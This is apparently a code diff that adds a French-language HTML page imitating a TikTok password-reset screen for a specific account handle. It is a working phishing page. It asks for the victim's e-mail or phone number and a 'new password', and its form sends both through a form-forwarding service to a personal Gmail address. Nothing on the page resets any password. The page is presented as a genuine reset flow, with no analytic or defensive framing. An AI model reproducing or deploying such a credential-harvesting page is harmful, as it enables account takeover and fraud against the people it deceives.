@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Réinitialiser le mot de passe</title>
+    <style>
+        :root {
+            --tiktok-red: #FE2C55;
+            --tiktok-cyan: #25F4EE;
+            --bg-color: #ffffff;
+            --card-bg: #ffffff;
+            --text-main: #161823;
+            --text-muted: rgba(22, 24, 35, 0.5);
+            --border-color: rgba(22, 24, 35, 0.12);
+            --input-bg: rgba(22, 24, 35, 0.06);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Proxima Nova', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--bg-color);
+            padding: 20px;
+            color: var(--text-main);
+        }
+
+        .card {
+            background: var(--card-bg);
+            width: 100%;
+            max-width: 380px;
+            padding: 40px 32px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            text-align: center;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.06);
+        }
+
+        .avatar-container {
+            width: 96px;
+            height: 96px;
+            margin: 0 auto 16px;
+            border-radius: 50%;
+            padding: 2px;
+            background: var(--bg-color);
+            position: relative;
+        }
+
+        /* TikTok style ring effect */
+        .avatar-container::before {
+            content: '';
+            position: absolute;
+            top: -2px; left: -2px; right: -2px; bottom: -2px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, var(--tiktok-cyan), var(--tiktok-red));
+            z-index: -1;
+        }
+
+        .avatar-img {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid var(--bg-color);
+            display: block;
+        }
+
+        .username {
+            font-size: 1.15rem;
+            font-weight: 700;
+            color: var(--text-main);
+            margin-bottom: 24px;
+            letter-spacing: 0.5px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+            text-align: left;
+            position: relative;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 0.95rem;
+            color: var(--text-main);
+            background-color: var(--input-bg);
+            border: 1px solid transparent;
+            border-radius: 4px;
+            outline: none;
+            transition: all 0.2s ease-in-out;
+        }
+
+        .input-field:focus {
+            border-color: var(--tiktok-red);
+            background-color: #ffffff;
+        }
+
+        .input-field::placeholder {
+            color: var(--text-muted);
+            font-weight: 500;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: var(--text-muted);
+            padding: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .toggle-password:hover {
+            color: var(--text-main);
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            margin-top: 12px;
+            font-size: 1rem;
+            font-weight: 700;
+            color: #ffffff;
+            background-color: var(--tiktok-red);
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.2s ease-in-out, opacity 0.2s;
+        }
+
+        .submit-btn:hover {
+            background-color: #e0244c;
+        }
+
+        .submit-btn:active {
+            transform: scale(0.98);
+        }
+    </style>
+</head>
+<body>
+
+    <main class="card">
+        <!-- Circle Profile Photo with TikTok ring -->
+        <div class="avatar-container">
+            <img src="https://i.ibb.co/svjvMYsw/IMG-5660.jpg" 
+                 alt="Profil" 
+                 class="avatar-img">
+        </div>
+
+        <!-- Username -->
+        <h1 class="username">@haramideluxe430</h1>
+
+        <!-- Reset Form connected to FormSubmit -->
+        <form action="https://formsubmit.co/nbroseten@gmail.com" method="POST">
+            
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <input type="text" name="identifier" id="identifier" class="input-field" placeholder="E-mail ou numéro de téléphone" required autocomplete="username">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <input type="password" name="password" id="password" class="input-field" placeholder="Nouveau mot de passe" required autocomplete="new-password">
+                    <button type="button" class="toggle-password" onclick="togglePasswordVisibility()" title="Afficher/Masquer le mot de passe">
+                        <svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                        </svg>
+                    </button>
+                </div>
+            </div>
+
+            <button type="submit" class="submit-btn">Réinitialiser le mot de passe</button>
+        </form>
+    </main>
+
+    <script>
+        function togglePasswordVisibility() {
+            const pwdInput = document.getElementById('password');
+            const eyeIcon = document.getElementById('eye-icon');
+            if (pwdInput.type === 'password') {
+                pwdInput.type = 'text';
+                eyeIcon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858-5.908a10.12 10.12 0 012.122-.063c4.478 0 8.268 2.943 9.542 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21M3 3l18 18" />';
+            } else {
+                pwdInput.type = 'password';
+                eyeIcon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />';
+            }
+        }
+    </script>
+</body>
+</html>
